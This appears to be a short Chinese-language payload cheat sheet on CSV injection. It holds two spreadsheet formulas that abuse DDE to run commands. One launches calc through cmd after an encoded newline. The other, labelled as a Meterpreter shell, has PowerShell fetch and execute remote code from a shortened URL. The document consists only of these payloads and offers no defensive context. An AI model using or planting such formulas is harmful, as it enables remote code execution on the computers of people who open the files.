## CSV 注入

**新的一行编码如下**

```
%0A-3+3+cmd|' /C calc'!D2
```

**Meterpreter Shell**

```
=cmd|'/C powershell IEX(wget bit.ly/1X146m3)'!A0
```

